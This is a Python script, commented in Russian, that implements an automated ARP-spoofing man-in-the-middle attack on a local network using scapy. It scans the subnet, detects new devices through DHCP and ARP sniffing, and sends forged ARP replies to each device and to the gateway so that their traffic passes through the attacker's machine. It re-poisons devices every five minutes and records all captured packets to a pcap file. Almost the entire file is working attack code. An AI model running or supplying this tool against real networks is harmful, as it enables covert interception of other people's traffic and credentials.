import threading
import time
import subprocess
import argparse
from scapy.all import *
import queue
from queue import Empty

from scapy.layers.dhcp import DHCP
from scapy.layers.inet import IP
from scapy.layers.l2 import ARP, Ether
from scapy.utils import PcapWriter
import os
import sys


def check_privileges():
    if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
        raise PermissionError("You need to run this script with sudo or as root.")


def get_default_if():
    if_list = get_if_list()
    if_dic = IFACES.data
    for item in if_list:
        if if_dic[item].name != "lo":
            return if_dic[item].name


def arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac, gateway_ip, gateway_mac):
    """
  Функция для ARP-подделки.

  ARP packet configuration:
  op = 1: -- "who has pdst tell psrc" ("ip is at mac"), при отправлении пакета psrc и hwsrc не используются!
  пакет летит к target ip адресу (заранее разрешит его по arp-у сам)

  op = 2: -- "psrc адрес is at hwsrc" ("ip is at mac"), при отправлении пакета psrc и hwsrc не используются!
  пакет летит к target ip адресу (заранее разрешит его по arp-у сам)
  """
    arp_packet = ARP(op=2, hwsrc=spoof_mac, psrc=spoof_ip, hwdst=target_mac, pdst=target_ip)
    arp_to_client_packet = ARP(op=2, psrc=gateway_ip, hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
    send(arp_to_client_packet, verbose=0, count=3)
    arp_to_AP_packet = ARP(op=2, psrc=target_ip, hwsrc=spoof_mac, hwdst=gateway_mac, pdst=gateway_ip)
    send(arp_to_AP_packet, verbose=0, count=3)
    print(f"ARP-подделка Клиент думает, что: {gateway_ip} ({gateway_mac}) -> {gateway_ip} ({spoof_mac})")
    print(f"                 AP думает, что: {target_ip} ({target_mac})   -> {target_ip} ({spoof_mac})")
    print(arp_packet.show())


def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name="captured_traffic.pcap"):
    """
  Функция для поиска новых устройств по DHCP и ARP,
  записи трафика в .pcap файл и передачи данных в очередь.
  """
    # Запись трафика в pcap файл
    pktdump = PcapWriter(pcap_name, append=True, sync=True)

    # Функция для обработки пакетов
    def packet_handler(packet):
        nonlocal queue

        if packet.haslayer(DHCP) or packet.haslayer(ARP):
            # Извлекаем IP и MAC адреса
            target_ip = packet[IP].dst if packet.haslayer(IP) else packet[ARP].pdst
            target_mac = packet[ARP].hwsrc if packet.haslayer(ARP) else packet[Ether].src

            # Проверяем, является ли устройство новым
            if target_ip not in queue.queue:
                # Добавляем устройство в очередь
                queue.put((target_ip, target_mac))

        # Записываем пакет в pcap файл
        pktdump.write(packet)

    while True:
        try:
            # Начинаем захват пакетов
            sniff(prn=packet_handler, iface=interface, store=0)
        except OSError as e:
            print(f"Ошибка сети: {e}")
            restart_network_service()
            # Повторно пробуем инициализировать сетевой интерфейс
            try:
                restart_network_interface(interface)
                print(f"Сетевой интерфейс '{interface}' активирован.")
            except OSError as e:
                print(f"Ошибка: Не удалось активировать сетевой интерфейс '{interface}'")
                time.sleep(5)  # Ожидание перед попыткой перезапуска


def restart_network_service():
    """
  Функция для перезапуска сетевой службы Linux Networking.
  """
    try:
        subprocess.run(["systemctl", "restart", "networking"])  # ifconfig wlan0 up
        print("Сетевая служба перезапущена.")
    except FileNotFoundError:
        print("Ошибка: systemctl не найден.")


def restart_network_interface(interface):
    """
  Функция для перезапуска рабочего интерфейса.
  """
    try:
        subprocess.run(["ifconfig", interface, "down"])
        subprocess.run(["ifconfig", interface, "up"])
        print("Сетевой интерфейс перезапущен.")
    except FileNotFoundError as e:
        print(f"Ошибка: {e}")


def get_gateway_mac(gateway):
    arp_packet = ARP(op=1, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff")
    ans = sr1(arp_packet)
    return ans.hwsrc

def send_arp_requests(interface="eth0"):
  """
  Функция для отправки массовых ARP-запросов.
  """
  # IP-адрес сети (например, 192.168.1.0/24)
  network = str(get_if_addr(interface)).rpartition(".")[0]+".0/24"
  for i in range(1, 255):
    target_ip = str(get_if_addr(interface)).rpartition(".")[0] + f".{i}"
    arp_packet = ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(arp_packet, verbose=0)
    print(f"ARP-запрос отправлен на {target_ip}")
    time.sleep(0.03) # небольшая задержка между запросами


def main():
    check_privileges()
    default_if = get_default_if()
    default_gateway = str(get_if_addr(default_if)).rpartition(".")[0] + ".1"
    parser = argparse.ArgumentParser(description="ARP-подделка с обнаружением новых устройств.")
    if len(sys.argv) == 1:
        parser.print_help()
        return
    parser.add_argument("-i", "--interface", type=str, help="Название сетевого интерфейса. Ex. eth0",
                        default=default_if)
    parser.add_argument("-g", "--gateway", type=str, help="Ip-адрес роутера", default=default_gateway)
    parser.add_argument("-w", type=str, help="Файл для записи перехваченных пакетов", default="captured_traffic.pcap")

    args = parser.parse_args()

    # Получаем параметры из командной строки
    interface = args.interface
    spoof_ip = get_if_addr(interface)
    spoof_mac = get_if_hwaddr(interface)
    gateway_ip = args.gateway
    gateway_mac = get_gateway_mac(gateway_ip)
    pcap_name = args.w

    # Создаем очередь для передачи данных
    queue = Queue()

    # Запускаем параллельный процесс для сканирования
    sniff_thread = threading.Thread(target=sniff_and_find_new_devices, args=(interface, queue, pcap_name))
    sniff_thread.daemon = True  # Делаем поток фоновым
    sniff_thread.start()

    old_list = []
    # Словарь для хранения времени последней ARP-подделки для каждого устройства
    last_spoof_time = {}
    
    send_arp_requests(interface)

    while True:
        try:
            # Извлекаем данные из очереди
            target_ip, target_mac = queue.get(timeout=1)
            # Отправляем ARP-подделку
            #arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac, gateway_ip, gateway_mac)
            if target_ip not in old_list:
              # Добавляем устройство в очередь
              old_list.append(target_ip)
              # Отправляем ARP-подделку для нового устройства сразу
              arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac, gateway_ip, gateway_mac)
              last_spoof_time[target_ip] = time.time()
            else:
              # Проверяем время последней ARP-подделки для этого устройства
              if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 300:
                # Отправляем ARP-подделку, если прошло более 5 минут
                arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac, gateway_ip, gateway_mac)
                last_spoof_time[target_ip] = time.time()
        except Empty:
            # Ожидаем новые данные
            pass
        except OSError as e:
            print(f"Ошибка сети: {e}")
            restart_network_service()
            # Повторно пробуем инициализировать сетевой интерфейс
            try:
                restart_network_interface(interface)
                print(f"Сетевой интерфейс '{interface}' активирован.")
            except OSError as e:
                print(f"Ошибка: Не удалось активировать сетевой интерфейс '{interface}'")
                time.sleep(5)  # Ожидание перед попыткой перезапуска


if __name__ == "__main__":
    main()
